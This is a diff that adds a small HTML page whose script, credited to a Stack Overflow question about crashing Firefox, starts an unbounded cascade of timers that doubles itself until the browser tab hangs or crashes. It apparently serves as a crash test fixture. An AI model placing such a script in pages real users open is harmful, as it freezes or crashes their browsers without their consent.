@@ -1,0 +1,11 @@
+<html>
+<body>
+<script>
+// thanks to http://stackoverflow.com/questions/2702547/crash-firefox-using-javascript
+function die () {
+  setTimeout(function () {die(); die()}, 0);
+}
+setTimeout(die, 1000);
+</script>
+</body>
+</html>
